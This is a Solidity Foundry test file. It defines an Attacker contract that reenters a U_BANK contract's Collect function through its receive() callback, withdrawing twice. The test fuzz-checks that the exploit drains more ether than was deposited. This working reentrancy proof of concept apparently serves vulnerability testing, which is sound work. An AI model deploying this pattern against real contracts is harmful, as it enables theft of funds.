
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {U_BANK, Log} from "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {
    U_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new U_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 2 ether && attackVal <= type(uint128).max / 4);

        vm.deal(address(_contractUnderTest), attackVal * 4);
        vm.deal(address(_attacker), attackVal * 4);
        vm.deal(address(this), attackVal * 4);

        vm.warp(block.timestamp + 100);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = U_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        require(msg.value == val, "Attacker: wrong msg.value");

        victim.Put{value: val}(block.timestamp - 1);
    }

    function attack(uint256 val) public {
        require(val == storedAttackVal, "Attacker: inconsistent val");

        initialSnapshot = address(this).balance;

        victim.Collect(val);

        if (attackCallCount >= 2 && address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }
}
